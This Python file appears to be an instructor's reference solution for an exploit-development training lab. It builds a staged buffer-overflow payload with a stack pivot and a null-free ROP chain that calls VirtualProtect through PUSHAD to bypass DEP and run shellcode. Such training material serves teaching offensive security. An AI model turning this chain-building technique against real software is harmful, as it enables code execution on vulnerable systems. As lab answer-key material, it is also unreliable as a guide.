"""Instructor-only layout helper for the constrained DEP-3 training profile.

The DEP-3 gadget set forces exam-like complexity:
  - No direct pop edx (must go through eax + xchg)
  - No direct pop ebx for null-containing sizes (NEG + xchg)
  - Multi-register clobber on bulk pops (pop ecx clobbers ebp/edi/eax;
    pop ebx clobbers ebp/eax)
  - Offset dereference: mov eax, [eax+0x10] requires pointer arithmetic
  - NEG encoding for PAGE_EXECUTE_READWRITE and region_size
  - Wider ESP adjustment (0x1C = 7 DWORDs instead of 4)
  - Null bytes forbidden in payload (enforced by helper_stage_record)
  - Write-what-where gadget available for advanced chains
"""

from __future__ import annotations

from dataclasses import dataclass
from struct import pack

from dep2_layout import OSED_STAGE_BYTES, _dword, first_stage_prefix_length


DEREF_OFFSET = 0x10
JUNK = 0x41414141


@dataclass(frozen=True)
class Dep3Gadgets:
    pop_eax: int
    pivot: int
    pop_ecx_ebp_edi_eax: int
    xchg_eax_edx: int
    pop_ebx_ebp_eax: int
    pop_ebp: int
    dereference_eax_plus_10: int
    xchg_eax_esi: int
    add_esp_0x1c: int
    pushad: int
    ret: int
    neg_eax: int
    mov_esi_eax: int
    xchg_eax_ebx: int


def _pack_words(values: list[int]) -> bytes:
    return b"".join(pack("<I", _dword(value, "chain value")) for value in values)


def _assert_no_null_bytes(data: bytes, label: str) -> None:
    if b"\x00" in data:
        offset = data.index(b"\x00")
        raise ValueError(
            f"{label} contains a null byte at offset {offset}; "
            f"DEP-3 helper_stage_record rejects payloads with 0x00"
        )


CHAIN_DWORDS = 28


def build_dep3_payload(
    *,
    saved_eip_offset: int,
    stage2_address: int,
    stage2_offset: int,
    cached_virtualprotect: int,
    proof: bytes,
    gadgets: Dep3Gadgets,
    region_size: int = 0x201,
) -> bytes:
    """Build the fixed-base staged chain required by the DEP-3 gadget contract.

    The chain is CHAIN_DWORDS DWORDs and requires careful register ordering
    to account for multi-pop clobbers and indirect register loads.  The
    entire payload must be null-free (enforced by the service).
    """
    prefix_length = first_stage_prefix_length(saved_eip_offset)
    if not isinstance(stage2_offset, int) or stage2_offset < prefix_length:
        raise ValueError("stage2_offset must follow the three-DWORD first stage")
    if not proof:
        raise ValueError("proof must not be empty")

    proof_address = _dword(stage2_address, "stage2_address") + (CHAIN_DWORDS * 4)
    if proof_address > 0xFFFFFFFF:
        raise ValueError("proof address must fit in a 32-bit DWORD")

    old_protect = proof_address + len(proof)
    if old_protect > 0xFFFFFFFF:
        raise ValueError("old-protect scratch address must fit in a 32-bit DWORD")

    vp_deref_ptr = _dword(
        (cached_virtualprotect - DEREF_OFFSET) & 0xFFFFFFFF,
        "VirtualProtect pointer adjusted for [eax+0x10] dereference",
    )

    for name, value in (
        ("old_protect", old_protect),
        ("vp_deref_ptr", vp_deref_ptr),
        ("stage2_address", stage2_address),
        ("proof_address", proof_address),
    ):
        _assert_no_null_bytes(pack("<I", _dword(value, name)), name)

    neg_page_rwx = _dword((-0x40) & 0xFFFFFFFF, "neg PAGE_EXECUTE_READWRITE")
    neg_region_size = _dword((-region_size) & 0xFFFFFFFF, "neg region_size")

    stage2 = _pack_words([
        # --- Load ECX = old_protect address (clobbers ebp, edi, eax) ---
        gadgets.pop_ecx_ebp_edi_eax,
        old_protect,                    # -> ECX
        JUNK,                           # -> EBP (junk, reloaded later)
        gadgets.ret,                    # -> EDI (park a RET here early)
        JUNK,                           # -> EAX (junk, reloaded next)

        # --- Load EDX = 0x40 via NEG encoding ---
        gadgets.pop_eax,
        neg_page_rwx,                   # -> EAX = 0xFFFFFFC0
        gadgets.neg_eax,                # -> EAX = 0x40
        gadgets.xchg_eax_edx,           # -> EDX = 0x40, EAX = junk

        # --- Load EBX = region_size via NEG encoding ---
        gadgets.pop_eax,
        neg_region_size,                # -> EAX = -region_size
        gadgets.neg_eax,                # -> EAX = region_size
        gadgets.xchg_eax_ebx,           # -> EBX = region_size

        # --- Load ESI = VirtualProtect (offset dereference) ---
        gadgets.pop_eax,
        vp_deref_ptr,                   # -> EAX = cached_vp - 0x10
        gadgets.dereference_eax_plus_10,  # -> EAX = *cached_vp = VirtualProtect
        gadgets.xchg_eax_esi,           # -> ESI = VirtualProtect

        # --- Load EBP = proof/shellcode return address ---
        gadgets.pop_ebp,
        proof_address,                  # -> EBP

        # --- Skip 0x1C bytes (7 DWORDs) before PUSHAD dispatch ---
        gadgets.add_esp_0x1c,
        JUNK, JUNK, JUNK, JUNK, JUNK, JUNK, JUNK,

        # --- PUSHAD dispatches VirtualProtect via register frame ---
        gadgets.pushad,
    ])

    first_stage = _pack_words([
        gadgets.pop_eax,
        stage2_address,
        gadgets.pivot,
    ])
    fill = bytes([0x41]) * saved_eip_offset
    payload = fill + first_stage
    payload += bytes([0x41]) * (stage2_offset - len(payload))
    payload += stage2 + bytes(proof) + pack("<I", JUNK)
    if len(payload) > OSED_STAGE_BYTES:
        raise ValueError("staged payload exceeds OSED_STAGE_BYTES")
    _assert_no_null_bytes(payload, "DEP-3 payload")
    return payload
